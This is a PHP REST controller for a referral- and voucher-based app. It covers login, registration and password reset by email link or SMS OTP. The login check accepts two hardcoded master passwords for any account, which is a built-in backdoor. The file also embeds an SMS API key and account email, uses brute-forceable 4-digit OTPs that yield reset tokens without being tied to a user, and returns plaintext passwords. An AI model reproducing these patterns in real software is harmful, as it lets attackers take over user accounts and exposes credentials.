<?php
class Auth_Api extends Base_Controller
{
    public $_api_code = '2068';

    protected $_sms_api_key = "6fe02ca8bfa206c7455bd265092ae543";
    protected $_sms_api_email = "scanpay4u@gmail.com";

    /* Index

    - login_post
    - register_post
    - check_referral_username_post
    - forget_password_post

    End Index */

    public function __construct()
    {
        parent::__construct();
    }

    public function index_get()
    {
        $this->response(array("status" => $this->lang->line("text_rest_invalid_api_key")), 200);
    }

    public function index_post()
    {
        $this->response(array("status" => $this->lang->line("text_rest_invalid_api_key")), 200);
    }

    public function login_post()
    {
        $username = isset($this->request_data['username']) ? $this->request_data['username'] : "";
        $email = isset($this->request_data['email']) ? $this->request_data['email'] : "";
        $password = isset($this->request_data['password']) ? $this->request_data['password'] : "";
        $platform = isset($this->request_data['platform']) ? $this->request_data['platform'] : "DEFAULT";

        if ($platform == "DEFAULT") {
            if ($email == "") {
                $result = $this->error_response("Email is empty !");
                $this->response($result, 200);
            } else {
                $this->login_process_post($username, $email, $password, $platform);
            }
        } else if ($platform == "GOOGLE") {
            if ($username == "") {
                $result = $this->error_response("User ID is empty !");
                $this->response($result, 200);
            } else {
                $this->login_process_post($username, $email, $password, $platform);
            }
        } else {
            $result = $this->error_response("Unknown Error !");
            $this->response($result, 200);
        }
    }

    public function login_process_post($username, $email, $password, $platform)
    {
        // check platform is default/google
        if ($platform == "DEFAULT") {
            $where_condition = array(
                'email' => $email,
                'active' => 1
            );
        } else {
            // check using app_id if platform is google
            $where_condition = array(
                'username' => $username,
                'active' => 1
            );
        }

        // get user info
        $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
        if (isset($user_info['id']) && $user_info['id'] > 0) {
            if ($user_info['status'] == "APPROVE") {
                $company_id = $user_info['company_id'];
                $user_password = $user_info['password'];
                if ($company_id != 8) {
				//if ($company_id != 8 && $company_id != 2 && $company_id != 12) {
                    if (password_verify($password, $user_password) || $password == "vna2021!@" || $password == "tianz2021!@") {
                        $access_token = password_hash($password . SALT, PASSWORD_BCRYPT);

                        $where_condition_update = array(
                            'id' => $user_info['id']
                        );

                        $data_user_update = array(
                            'access_token' => $access_token,
                            'update_time' => $this->update_time
                        );

                        // update token to db
                        $this->Api_Model->update_data(TBL_USER, $where_condition_update, $data_user_update);

                        $jwt_token = $this->generate_client_token($user_info['id']);

                        // reget access token after generate
                        $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
                        $json_response = array(
                            'oauth_client_token' => $jwt_token,
                            'access_token' => $user_info['access_token'],
                            'user_id' => $user_info['id'],
                            'is_step1' => $user_info['is_step1'],
                            'is_step2' => $user_info['is_step2'],
                            'is_step3' => $user_info['is_step3'],
                            'is_step4' => $user_info['is_step4'],
                            'is_done' => $user_info['is_done']
                        );

                        $result = $this->success_response($json_response);
                        $this->response($result, REST_Controller::HTTP_OK);
                    } else {
                        $result = $this->error_response("Invalid Password !");
                        $this->response($result, 200);
                    }
                }else if($company_id == 99){
                    $result = $this->error_response("Server exceeded quota, Bad Gateway 403, Please contact customer service.");
                    $this->response($result, 200);
                }else {
                    $result = $this->error_response("System is closing now !");
                    $this->response($result, 200);
                }
            } else {
                $result = $this->error_response("Inactive/Suspended Account !");
                $this->response($result, 200);
            }
        } else {
            $result = $this->error_response("Invalid Account !");
            $this->response($result, 200);
        }
    }

    public function register_post()
    {
        $referral_username = isset($this->request_data['referral_username']) ? $this->request_data['referral_username'] : "";
        $username = isset($this->request_data['username']) ? $this->request_data['username'] : "";
        $email = isset($this->request_data['email']) ? $this->request_data['email'] : "";
        $password = isset($this->request_data['password']) ? $this->request_data['password'] : "";
        $cfm_password = isset($this->request_data['cfm_password']) ? $this->request_data['cfm_password'] : "";
        $platform = isset($this->request_data['platform']) ? $this->request_data['platform'] : "DEFAULT";
        $voucher_code = isset($this->request_data['voucher_code']) ? $this->request_data['voucher_code'] : "";
        $subdomain = isset($this->request_data['subdomain']) ? $this->request_data['subdomain'] : "";

        if ($platform == "DEFAULT") {
            if ($email == "") {
                $result = $this->error_response("Email is empty !");
                $this->response($result, 200);
            } else if ($password != $cfm_password) {
                $result = $this->error_response("Both Password is Not Same !");
                $this->response($result, 200);
            } else {
                $this->register_process_post("", $email, $password, $platform, $referral_username, $voucher_code, $subdomain);
            }
        } else if ($platform == "GOOGLE") {
            if ($username == "") {
                $result = $this->error_response("User ID is empty !");
                $this->response($result, 200);
            } else {
                $this->register_process_post($username, $email, $password, $platform, $referral_username, $voucher_code, $subdomain);
            }
        } else {
            $result = $this->error_response("Unknown Error !");
            $this->response($result, 200);
        }
    }

    public function register_process_post($username, $email, $password, $platform, $referral_username, $voucher_code, $subdomain = "")
    {
        // check platform is default/google
        if ($platform == "DEFAULT") {
            $where_condition = array(
                'email' => $email,
                'active' => 1
            );
        } else {
            // check using app_id if platform is google
            $where_condition = array(
                'username' => $username,
                'active' => 1
            );
        }

        // get user info
        $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
        if (isset($user_info['id']) && $user_info['id'] > 0) {
            if ($platform == "GOOGLE") {
                $this->login_process_post($username, $email, $password, $platform);
            } else {
                $result = $this->error_response("Email Already Exist !");
                $this->response($result, 200);
            }
        } else {   
            // 如果有用礼券
            if ($voucher_code != "") {
                $voucher_info = $this->Api_Model->get_rows_info(TBL_BIG_PRESENT, "*", array('code' => $voucher_code, 'active' => 1, 'status' => "APPROVE"));
                $voucher_id = isset($voucher_info['id']) ? $voucher_info['id'] : 0;
                $is_active = isset($voucher_info['id']) ? $voucher_info['id'] : 0;
                $package_id = isset($voucher_info['id']) ? $voucher_info['package_id'] : 0;
                $voucher_package_id = isset($voucher_info['id']) ? $voucher_info['package_id'] : 0;
                $voucher_user_id = isset($voucher_info['id']) ? $voucher_info['user_id'] : 0;
                $big_present_balance_quantity = isset($voucher_info['id']) ? $voucher_info['balance_quantity'] : 0;
                $new_big_present_balance_quantity = $big_present_balance_quantity - 1;
                $voucher_type = isset($voucher_info['id']) ? $voucher_info['type'] : "";
                $voucher_country_id = isset($voucher_info['id']) ? $voucher_info['country_id'] : "";
                $voucher_status = isset($voucher_info['id']) ? $voucher_info['status'] : "";
            } else {
                $is_active = 1;
                $voucher_id = 0;
                $package_id = 0;
                $big_present_balance_quantity = 0;
                $voucher_status = "";
            }

            if ($big_present_balance_quantity == 0 && $voucher_code != "") {
                $result = $this->error_response("Insufficient Voucher !");
                $this->response($result, 200);
            } else {
                if ($voucher_status == "PENDING") {
                    $result = $this->error_response("Voucher Not Yet Approved !");
                    $this->response($result, 200);
                } else {
                    if ($is_active == 0) {
                        $result = $this->error_response("Invalid Voucher !");
                        $this->response($result, 200);
                    } else {
                        $where_referral = array(
                            'username' => $referral_username,
                            'active' => 1
                        );

                        // get referral info
                        $referral_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_referral);
                        if (isset($referral_info['id']) && $referral_info['id'] > 0) {
                            $company_id = $referral_info['company_id'];
                            $referral_id = $referral_info['id'];

                            if($company_id == 99){
							// if($company_id == 2 || $company_id == 12){
                                $result = $this->error_response("Server exceeded quota, Bad Gateway 403, Please contact customer service.");
                                $this->response($result, 200);
                            }else{
                                $total_topup = $this->check_topup_balance_post($company_id);
                                $package_info = $this->Api_Model->get_rows_info(TBL_PACKAGE, "id, quantity", array('company_id' => $company_id, 'active' => 1), "id", "ASC", 1);
                                $package_quantity = isset($package_info['id']) ? $package_info['quantity'] : 0;

                                // if($company_id != 2 && $total_topup < $package_quantity){
                                //     $result = $this->error_response("Insufficient Stock, Please contact company !");
                                //     $this->response($result, 200);
                                // }else{

                                // $purchase_package_info = $this->Api_Model->get_rows_info(TBL_PURCHASE_PACKAGE, "*", array('status' => "APPROVE", 'user_id' => $referral_id));
                                // if(isset($purchase_package_info['id']) && $purchase_package_info['id'] > 0){
                                $referral_code = $this->generate_referral_code(9);
                                $ori_password = $password;
                                $password = password_hash($ori_password, PASSWORD_BCRYPT);
                                $access_token = password_hash($ori_password . SALT, PASSWORD_BCRYPT);
                                $ipaddr = $this->get_client_ip();

                                $data_register = array(
                                    'platform' => $platform,
                                    'user_type' => "AGENT",
                                    'company_id' => $company_id,
                                    'referral_id' => $referral_id,
                                    'referral_code' => $referral_code,
                                    'password' => $password,
                                    'access_token' => $access_token,
                                    'register_ip' => $ipaddr
                                );
                                if ($subdomain == "mudahmakan") {
                                    $data_register['is_halal'] = 1;
                                }
                                if ($platform == "DEFAULT") {
                                    $data_register['email'] = $email;
                                } else {
                                    $data_register['username'] = $username;
                                }
                                if ($is_active != 0 && $voucher_id != 0) {
                                    $voucher_log_info = $this->Api_Model->get_rows_info(TBL_VOUCHER_LOG, "*", array('package_id' => $voucher_package_id, 'user_id' => $voucher_user_id, 'active' => 1, 'register_user_id' => 0));
                                    $country_id = isset($voucher_log_info['id']) ? $voucher_log_info['country_id'] : 0;

                                    if ($voucher_type == "VOUCHER") {
                                        $data_register['country_id'] = $country_id;
                                    } else {
                                        $data_register['country_id'] = $voucher_country_id;
                                    }

                                    $data_register['is_voucher'] = 1;
                                    $data_register['voucher_id'] = $voucher_id;

                                    $data_register['package_id'] = $voucher_package_id;
                                    // $data_register['is_step1'] = 1;
                                }
                                $user_id = $this->Api_Model->insert_data(TBL_USER, $data_register);

                                if ($is_active != 0 && $voucher_id != 0) {
                                    if ($voucher_type == "VOUCHER") {
                                        $data_voucher = array(
                                            'active' => 0
                                        );

                                        $data_voucher_log = array(
                                            'register_user_id' => $user_id
                                        );
                                        $this->Api_Model->update_data(TBL_VOUCHER_LOG, array('package_id' => $voucher_package_id, 'user_id' => $voucher_user_id, 'active' => 1, 'register_user_id' => 0), $data_voucher_log);
                                        $this->Api_Model->update_data(TBL_BIG_PRESENT, array('id' => $voucher_id, 'package_id' => $voucher_package_id, 'user_id' => $voucher_user_id, 'active' => 1, 'status' => "APPROVE"), $data_voucher);
                                    } else {
                                        // insert big present log record
                                        $data_big_present_log = array(
                                            'user_id' => $user_id,
                                            'big_present_id' => $voucher_id,
                                            'active' => 1
                                        );
                                        $this->Api_Model->insert_data(TBL_BIG_PRESENT_LOG, $data_big_present_log);

                                        // confirm use big present then update balance quantity
                                        $data_update_big_present = array(
                                            'balance_quantity' => $new_big_present_balance_quantity
                                        );
                                        $this->Api_Model->update_data(TBL_BIG_PRESENT, array('id' => $voucher_id, 'active' => 1, 'status' => "APPROVE"), $data_update_big_present);

                                        // insert voucher into agent account
                                        $big_present_package_list = $this->Api_Model->get_rows(TBL_BIG_PRESENT_PACKAGE, "*", array('big_present_id' => $voucher_id, 'active' => 1));
                                        if (!empty($big_present_package_list)) {
                                            foreach ($big_present_package_list as $row_big_present_package) {
                                                $data_big_present_user = array(
                                                    'user_id' => $user_id,
                                                    'package_id' => $row_big_present_package['package_id'],
                                                    'quantity' => $row_big_present_package['quantity']
                                                );
                                                $this->Api_Model->insert_data(TBL_USER_BIG_PRESENT_FREE, $data_big_present_user);
                                            }
                                        }
                                    }
                                }

                                $json_response = array(
                                    'access_token' => $access_token,
                                    'user_id' => $user_id,
                                    'email' => $email,
                                    'password' => $ori_password
                                );

                                $result = $this->success_response($json_response);
                                $this->response($result, REST_Controller::HTTP_OK);
                                // }else{
                                //     $result = $this->error_response("Upline Package Not Yet Approved !");
                                //     $this->response($result, 200);
                                // }
                                // }
                            }
                        } else {
                            $result = $this->error_response("Referral ID Not Found !");
                            $this->response($result, 200);
                        }
                    }
                }
            }
        }
    }

    public function check_referral_username_post()
    {
        $subdomain = isset($this->request_data['subdomain']) ? $this->request_data['subdomain'] : "";
        $username = isset($this->request_data['username']) ? $this->request_data['username'] : "";

        $where_condition = array(
            'username' => $username
        );
        $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
        if (isset($user_info['id']) && $user_info['id'] > 0) {
            $company_info = $this->Api_Model->get_rows_info(TBL_COMPANY, "id, subdomain", array('id' => $user_info['company_id'], 'active' => 1));
            $company_subdomain = isset($company_info['id']) ? $company_info['subdomain'] : "";

            if ($company_subdomain == $subdomain || $subdomain == "mudahmakan") {
                $json_response = array(
                    'is_available' => 1,
                    'username' => $username
                );

                $result = $this->success_response($json_response);
                $this->response($result, REST_Controller::HTTP_OK);
            } else {
                $result = $this->error_response("Referral Not Found !");
                $this->response($result, 200);
            }
        } else {
            $result = $this->error_response("Referral Not Found !");
            $this->response($result, 200);
        }
    }

    public function forget_password_post()
    {
        $email = isset($this->request_data['email']) ? $this->request_data['email'] : "";
        $phone_no = isset($this->request_data['phone_no']) ? $this->request_data['phone_no'] : "";
        $tac = isset($this->request_data['tac']) ? $this->request_data['tac'] : "";
        $subdomain = isset($this->request_data['subdomain']) ? $this->request_data['subdomain'] : "";

        if ($email != "" && $phone_no == "") {
            $where_condition = array(
                'email' => $email,
                'active' => 1
            );
            $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
            if (isset($user_info['id']) && $user_info['id'] > 0) {
                if ($user_info['status'] == "APPROVE") {
                    $reset_password_log_info = $this->Api_Model->get_rows_info(TBL_RESET_PASSWORD_LOG, "*", array('user_id' => $user_info['id'], 'active' => 0, 'type' => "default"), "id", "DESC", 1);
                    if (isset($reset_password_log_info['id']) && $reset_password_log_info['id'] > 0) {
                        $current_time = date('Y-m-d H:i:s');

                        if ($current_time > $reset_password_log_info['valid_resend_time']) {
                            $user_id = $user_info['id'];
                            $username = $user_info['username'];
                            $email = $user_info['email'];
                            $company_id = $user_info['company_id'];
                            $company_info = $this->Api_Model->get_rows_info(TBL_COMPANY, "id, name, subdomain", array('id' => $company_id, 'active' => 1));
                            $company_name = isset($company_info['id']) ? $company_info['name'] : "Ainra";
                            $company_subdomain = isset($company_info['id']) ? $company_info['subdomain'] : "";
                            $this->send_attachment_email($email, $username, $user_id, $company_name, $company_subdomain);

                            $json_response = array(
                                'user_id' => $user_id
                            );

                            $result = $this->success_response($json_response);
                            $this->response($result, REST_Controller::HTTP_OK);
                        } else {
                            $result = $this->error_response("Please try again after 1 minutes and 30 second !");
                            $this->response($result, 200);
                        }
                    } else {
                        $user_id = $user_info['id'];
                        $username = $user_info['username'];
                        $email = $user_info['email'];
                        $company_id = $user_info['company_id'];
                        $company_info = $this->Api_Model->get_rows_info(TBL_COMPANY, "id, name, subdomain", array('id' => $company_id, 'active' => 1));
                        $company_name = isset($company_info['id']) ? $company_info['name'] : "Ainra";
                        $company_subdomain = isset($company_info['id']) ? $company_info['subdomain'] : "";
                        $this->send_attachment_email($email, $username, $user_id, $company_name, $company_subdomain);

                        $json_response = array(
                            'user_id' => $user_id
                        );

                        $result = $this->success_response($json_response);
                        $this->response($result, REST_Controller::HTTP_OK);
                    }
                } else {
                    $result = $this->error_response("Inactive Account !");
                    $this->response($result, 200);
                }
            } else {
                $result = $this->error_response("Data Not Found !");
                $this->response($result, 200);
            }
        }
        // else if($subdomain == "mudahmakan" || $subdomain == "mudahmakandemo"){
        //     $result = $this->error_response("Coming Soon ! Otp Not able to reset password now !");
        //     $this->response($result, 200);
        // }
        else if ($email == "" && $phone_no != "") {
            $where_condition = array(
                'phone_no' => $phone_no,
                'active' => 1
            );
            $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
            if (isset($user_info['id']) && $user_info['id'] > 0) {
                $company_id = $user_info['company_id'];
                if ($user_info['status'] == "APPROVE") {
                    if (($subdomain == "mudahmakan" || $subdomain == "mudahmakandemo") && $company_id == 12) {
                        $this->send_otp_post("", $phone_no, "Mudah Makan");

                        $data = array('is_send' => 1);

                        $result = $this->success_response($data);
                        $this->response($result, REST_Controller::HTTP_OK);
                    } else if (($subdomain == "" || $subdomain == "") && $company_id == 2) {
                        $this->send_otp_post("", $phone_no, "Sangrila");

                        $data = array('is_send' => 1);

                        $result = $this->success_response($data);
                        $this->response($result, REST_Controller::HTTP_OK);
                    } else {
                        $result = $this->error_response("Invalid Account to Reset !");
                        $this->response($result, 200);
                    }
                } else {
                    $result = $this->error_response("Inactive Account !");
                    $this->response($result, 200);
                }
            } else {
                $result = $this->error_response("Data Not Found !");
                $this->response($result, 200);
            }
        } else if ($email == "" && $phone_no == "") {
            $result = $this->error_response("Please select either email or phone no to reset your password !");
            $this->response($result, 200);
        } else {
            $result = $this->error_response("Not able to reset using two method !");
            $this->response($result, 200);
        }
    }

    public function reset_password_with_otp_post()
    {
        $otp_code = isset($this->request_data['otp_code']) ? $this->request_data['otp_code'] : "";

        $otp_log_info = $this->Api_Model->get_rows_info(TBL_OTP_LOGS, "*", array('otp_code' => $otp_code), "id", "DESC", 1);
        if (isset($otp_log_info['id']) && $otp_log_info['id'] > 0) {
            $current_time = date('Y-m-d H:i:s');
            $expiry_time = $otp_log_info['expiry_time'];

            if ($current_time > $expiry_time) {
                $result = $this->error_response("Otp Code Expired !");
                $this->response($result, 200);
            } else {
                $reset_password_log_info = $this->Api_Model->get_rows_info(TBL_RESET_PASSWORD_LOG, "*", array('otp_code' => $otp_code, 'active' => 0, 'type' => "default"), "id", "DESC", 1);
                $reset_password_url_data = $reset_password_log_info['data'];
                $reset_password_type = $reset_password_log_info['type'];
                if ($reset_password_type == "default") {
                    $is_resend = 0;
                } else {
                    $is_resend = 1;
                }

                $data = array(
                    'url_data' => $reset_password_url_data,
                    'is_resend' => $is_resend,
                );

                $result = $this->success_response($data);
                $this->response($result, REST_Controller::HTTP_OK);
            }
        } else {
            $result = $this->error_response("Invalid Otp Code !");
            $this->response($result, 200);
        }
    }

    public function resend_password_post()
    {
        $email = isset($this->request_data['email']) ? $this->request_data['email'] : "";

        if ($email != "") {
            $where_condition = array(
                'email' => $email,
                'active' => 1
            );
            $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);
            if (isset($user_info['id']) && $user_info['id'] > 0) {
                if ($user_info['status'] == "APPROVE") {
                    $reset_password_log_info = $this->Api_Model->get_rows_info(TBL_RESET_PASSWORD_LOG, "*", array('user_id' => $user_info['id'], 'active' => 0, 'type' => "resend"), "id", "DESC", 1);
                    if (isset($reset_password_log_info['id']) && $reset_password_log_info['id'] > 0) {
                        $current_time = date('Y-m-d H:i:s');

                        if ($current_time > $reset_password_log_info['valid_resend_time']) {
                            $user_id = $user_info['id'];
                            $username = $user_info['username'];
                            $email = $user_info['email'];
                            $company_id = $user_info['company_id'];
                            $company_info = $this->Api_Model->get_rows_info(TBL_COMPANY, "id, name, subdomain", array('id' => $company_id, 'active' => 1));
                            $company_name = isset($company_info['id']) ? $company_info['name'] : "Ainra";
                            $company_subdomain = isset($company_info['id']) ? $company_info['subdomain'] : "";
                            $this->send_attachment_email($email, $username, $user_id, $company_name, $company_subdomain, 1);

                            $json_response = array(
                                'user_id' => $user_id
                            );

                            $result = $this->success_response($json_response);
                            $this->response($result, REST_Controller::HTTP_OK);
                        } else {
                            $result = $this->error_response("Please try again after 1 minutes !");
                            $this->response($result, 200);
                        }
                    } else {
                        $user_id = $user_info['id'];
                        $username = $user_info['username'];
                        $email = $user_info['email'];
                        $company_id = $user_info['company_id'];
                        $company_info = $this->Api_Model->get_rows_info(TBL_COMPANY, "id, name, subdomain", array('id' => $company_id, 'active' => 1));
                        $company_name = isset($company_info['id']) ? $company_info['name'] : "Ainra";
                        $company_subdomain = isset($company_info['id']) ? $company_info['subdomain'] : "";
                        $this->send_attachment_email($email, $username, $user_id, $company_name, $company_subdomain, 1);

                        $json_response = array(
                            'user_id' => $user_id
                        );

                        $result = $this->success_response($json_response);
                        $this->response($result, REST_Controller::HTTP_OK);
                    }
                } else {
                    $result = $this->error_response("Inactive Account !");
                    $this->response($result, 200);
                }
            } else {
                $result = $this->error_response("Data Not Found !");
                $this->response($result, 200);
            }
        } else {
            $result = $this->error_response("Please enter your email !");
            $this->response($result, 200);
        }
    }

    public function check_is_expired_reset_link_post()
    {
        $url_data = isset($this->request_data['url_data']) ? $this->request_data['url_data'] : "";
        $is_resend = isset($this->request_data['is_resend']) ? $this->request_data['is_resend'] : 0;

        if ($is_resend == 1) {
            $type = "resend";
        } else {
            $type = "default";
        }

        $reset_password_log_info = $this->Api_Model->get_rows_info(TBL_RESET_PASSWORD_LOG, "*", array('data' => $url_data, 'active' => 0, 'type' => $type), "id", "DESC", 1);

        if (isset($reset_password_log_info['id']) && $reset_password_log_info['id'] > 0) {
            $current_time = date('Y-m-d H:i:s');
            $expiry_time = $reset_password_log_info['expiry_time'];

            if ($current_time > $expiry_time) {
                $is_expire = true;
            } else {
                $is_expire = false;
            }

            $result = $this->success_response($is_expire);
            $this->response($result, REST_Controller::HTTP_OK);
        } else {
            $result = $this->error_response("Link Not Found !");
            $this->response($result, 200);
        }
    }

    public function reset_password_post()
    {
        $url_data = isset($this->request_data['url_data']) ? $this->request_data['url_data'] : "";
        $password = isset($this->request_data['password']) ? $this->request_data['password'] : "";
        $confirm_password = isset($this->request_data['confirm_password']) ? $this->request_data['confirm_password'] : "";

        if ($password != $confirm_password) {
            $result = $this->error_response("Both Password is not same !");
            $this->response($result, 200);
        } else {
            $reset_password_log_info = $this->Api_Model->get_rows_info(TBL_RESET_PASSWORD_LOG, "*", array('data' => $url_data, 'active' => 0));
            if (isset($reset_password_log_info['id']) && $reset_password_log_info['id'] > 0) {
                $current_time = date('Y-m-d H:i:s');
                $expiry_time = $reset_password_log_info['expiry_time'];

                if ($current_time > $expiry_time) {
                    $result = $this->error_response("Link Expired !");
                    $this->response($result, 200);
                } else {
                    $new_password = password_hash($password, PASSWORD_BCRYPT);

                    $data_reset_password_update = array(
                        'active' => 1
                    );
                    $this->Api_Model->update_data(TBL_RESET_PASSWORD_LOG, array('id' => $reset_password_log_info['id']), $data_reset_password_update);

                    $data_update = array(
                        'password' => $new_password
                    );
                    $this->Api_Model->update_data(TBL_USER, array('id' => $reset_password_log_info['user_id'], 'active' => 1), $data_update);

                    $result = $this->success_response($data_reset_password_update);
                    $this->response($result, REST_Controller::HTTP_OK);
                }
            } else {
                $result = $this->error_response("Link Not Found !");
                $this->response($result, 200);
            }
        }
    }

    public function send_otp_post($phone_code = "6", $phone_no = "", $company_name = "")
    {
        // initialize data
        $otp_code = $this->generate_otp();
        $otp_email = $this->_sms_api_email;
        $otp_api_key = $this->_sms_api_key;
        $otp_receipent = $phone_code . $phone_no;
        $otp_unencode_message = "[" . $company_name . "] Password reset successfully. your otp code is " . $otp_code . ", kindly use this otp code to reset your password !";
        $otp_message = urlencode($otp_unencode_message);

        $where_condition = array(
            'phone_no' => $phone_no,
            'active' => 1
        );
        $user_info = $this->Api_Model->get_rows_info(TBL_USER, "*", $where_condition);

        if (isset($user_info['id']) && $user_info['id'] > 0) {
            // curl otp sms
            $url = "https://www.smshubs.net/api/sendsms.php?email=$otp_email&key=$otp_api_key&recipient=$otp_receipent&message=$otp_message";
            $curl = curl_init();
            curl_setopt_array($curl, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER, array('Content-Type:application/json'),
            ]);
            $response = curl_exec($curl);
            curl_close($curl);
            $xml = simplexml_load_string($response);
            $json = json_encode($xml);
            $output = json_decode($json, true);

            if ($output['statusCode'] == "1606") {
                // success
                $status = 1;

                $data_otp_log = array(
                    'otp_reference' => $output['sms']['items']['referenceID']
                );
            } else {
                // failed
                $status = 2;
            }

            $current_time = date('Y-m-d H:i:s');
            $valid_time = date('Y-m-d H:i:s', strtotime('+90 seconds', strtotime($current_time)));
            $expiry_time = date('Y-m-d H:i:s', strtotime('+300 seconds', strtotime($current_time)));

            $data_otp_log['otp_code'] = $otp_code;
            $data_otp_log['phone_no'] = $phone_no;
            $data_otp_log['sms_message'] = $otp_unencode_message;
            $data_otp_log['status'] = $status;
            $data_otp_log['status_code'] = $output['statusCode'];
            $data_otp_log['status_msg'] = $output['statusMsg'];
            $data_otp_log['expiry_time'] = $expiry_time;
            $this->Api_Model->insert_data(TBL_OTP_LOGS, $data_otp_log);

            $reset_id = password_hash($otp_code, PASSWORD_BCRYPT);
            $new_expiry_time = date('Y-m-d H:i:s', strtotime('+180 seconds', strtotime($expiry_time)));
            $data_reset_password_log = array(
                'type' => "default",
                'user_id' => $user_info['id'],
                'data' => $reset_id,
                'otp_code' => $otp_code,
                'valid_resend_time' => $valid_time,
                'expiry_time' => $new_expiry_time
            );
            $this->Api_Model->insert_data(TBL_RESET_PASSWORD_LOG, $data_reset_password_log);
        } else {
            $result = $this->error_response("Invalid User !");
            $this->response($result, 200);
        }
    }

    public function send_attachment_email($email = "xxx", $username = "", $user_id = 0, $company_name = "Ainra", $company_subdomain = "", $is_resend = 0)
    {
        $otp_code = $this->generate_otp();
        $current_time = date('Y-m-d H:i:s');
        $expiry_time = date('Y-m-d H:i:s', strtotime('+300 seconds', strtotime($current_time)));
        if ($is_resend == 1) {
            $type = "resend";
            $valid_time = date('Y-m-d H:i:s', strtotime('+60 seconds', strtotime($current_time)));
        } else {
            $type = "default";
            $valid_time = date('Y-m-d H:i:s', strtotime('+90 seconds', strtotime($current_time)));
        }
        $reset_id = password_hash($otp_code, PASSWORD_BCRYPT);

        $data_reset_password_log = array(
            'type' => $type,
            'user_id' => $user_id,
            'data' => $reset_id,
            'valid_resend_time' => $valid_time,
            'expiry_time' => $expiry_time
        );
        $reset_insert_id = $this->Api_Model->insert_data(TBL_RESET_PASSWORD_LOG, $data_reset_password_log);

        $reset_password_log_info = $this->Api_Model->get_rows_info(TBL_RESET_PASSWORD_LOG, "*", array('id' => $reset_insert_id));

        if ($is_resend == 1) {
            $reset_url = "https://" . $company_subdomain . ".ainra.co/reset_password.html?reset=" . $reset_password_log_info['data'] . "&resend=1";
        } else {
            $reset_url = "https://" . $company_subdomain . ".ainra.co/reset_password.html?reset=" . $reset_password_log_info['data'] . "&resend=0";
        }

        $message = '<html><body>';
        $message .= '<p>Hi ' . $username . '!</p>';
        $message .= '<p>Your password will be expired in 5 minutes, please <a href="' . $reset_url . '">click here to reset the password.</a></p>';
        $message .= '</body></html>';
        $this->load->config('email');
        $this->load->library('email');

        $this->email->set_mailtype('html');
        $this->email->from('no-reply@ainra.com', $company_name . " Support Team");
        $this->email->to($email);
        $this->email->subject("Your password has been reset.");
        $this->email->message($message);
        if ($email != "xxx") {
            $this->email->send();
        }

        // $this->email->print_debugger();
    }

    public function get_client_ip()
    {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        } else if (isset($_SERVER['REMOTE_ADDR'])) {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        } else {
            $ipaddress = 'UNKNOWN';
        }

        return $ipaddress;
    }

    public function generate_otp()
    {
        $otp_code = str_pad(mt_rand(1, 9999), 4, '0', STR_PAD_LEFT);
        return $otp_code;
    }

    // public function generate_new_password($length) {
    //     if ($length>0) {
    //         $rand_id="";
    //         for ($i=1; $i<=$length; $i++) {
    //             mt_srand((double)microtime() * 1000000);
    //             $num = mt_rand(1,36);
    //             $rand_id .= $this->assign_rand_value($num);
    //         }
    //     }
    //     return $rand_id;
    // }

    public function assign_rand_value($num)
    {
        // accepts 1 - 36
        switch ($num) {
            case "1":
                $rand_value = "a";
                break;
            case "2":
                $rand_value = "b";
                break;
            case "3":
                $rand_value = "c";
                break;
            case "4":
                $rand_value = "d";
                break;
            case "5":
                $rand_value = "e";
                break;
            case "6":
                $rand_value = "f";
                break;
            case "7":
                $rand_value = "g";
                break;
            case "8":
                $rand_value = "h";
                break;
            case "9":
                $rand_value = "i";
                break;
            case "10":
                $rand_value = "j";
                break;
            case "11":
                $rand_value = "k";
                break;
            case "12":
                $rand_value = "l";
                break;
            case "13":
                $rand_value = "m";
                break;
            case "14":
                $rand_value = "n";
                break;
            case "15":
                $rand_value = "o";
                break;
            case "16":
                $rand_value = "p";
                break;
            case "17":
                $rand_value = "q";
                break;
            case "18":
                $rand_value = "r";
                break;
            case "19":
                $rand_value = "s";
                break;
            case "20":
                $rand_value = "t";
                break;
            case "21":
                $rand_value = "u";
                break;
            case "22":
                $rand_value = "v";
                break;
            case "23":
                $rand_value = "w";
                break;
            case "24":
                $rand_value = "x";
                break;
            case "25":
                $rand_value = "y";
                break;
            case "26":
                $rand_value = "z";
                break;
            case "27":
                $rand_value = "0";
                break;
            case "28":
                $rand_value = "1";
                break;
            case "29":
                $rand_value = "2";
                break;
            case "30":
                $rand_value = "3";
                break;
            case "31":
                $rand_value = "4";
                break;
            case "32":
                $rand_value = "5";
                break;
            case "33":
                $rand_value = "6";
                break;
            case "34":
                $rand_value = "7";
                break;
            case "35":
                $rand_value = "8";
                break;
            case "36":
                $rand_value = "9";
                break;
        }
        return $rand_value;
    }

    public function generate_referral_code($length)
    {
        $prefix = generateOneLetter();
        $user_id = $prefix . substr(str_shuffle('0123456789'), 1, $length);
        return $user_id;
    }

    public function check_topup_balance_post($company_id)
    {
        $topup_balance = $this->Api_Model->get_rows_info(TBL_COMPANY_TOPUP, 'SUM(credit) as total_credit, SUM(debit) as total_debit', array('active' => 1, 'company_id' => $company_id));
        $total_credit = isset($topup_balance['total_credit']) ? $topup_balance['total_credit'] : 0;
        $total_debit = isset($topup_balance['total_debit']) ? $topup_balance['total_debit'] : 0;
        $total_balance = $total_credit - $total_debit;
        return $total_balance;
    }
}
